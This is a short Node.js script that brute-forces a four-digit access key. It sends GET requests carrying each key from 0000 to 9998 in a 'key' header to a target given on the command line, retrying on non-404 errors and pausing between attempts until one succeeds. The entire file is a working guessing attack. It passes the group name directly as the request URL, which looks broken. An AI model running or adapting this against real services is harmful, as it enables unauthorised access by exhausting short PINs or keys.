import otherGroups from '../../db/groups.json' assert { type: 'json' };
import axios from 'axios';

const targetGroup = process.argv[2];

function wait(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function call() {
  if (!otherGroups[targetGroup]) {
    console.log(`Group '${targetGroup}' doesn't exist`);
  } else {
    for (let counter = 0; counter < 9999; counter++) {
      const key = counter.toString().padStart(4, '0');
      console.log(key);
      try {
        await axios.get(targetGroup, {
          headers: { key },
        });
        console.log('Key found:', key);
        return;
      } catch (error) {
        if (error.response && error.response.status != '404') counter--;
        await wait(5000);
      }
    }
  }
}
call();
